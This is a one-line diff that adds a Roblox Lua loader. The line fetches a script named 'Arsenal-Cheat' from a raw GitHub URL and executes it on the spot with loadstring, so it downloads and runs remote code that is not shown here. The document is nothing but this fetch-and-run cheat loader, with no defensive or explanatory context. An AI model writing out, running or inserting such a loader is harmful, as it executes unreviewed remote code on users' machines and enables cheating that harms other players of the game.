@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Aktus11-creator/Arsenal-Cheat/refs/heads/main/v1.lua"))()
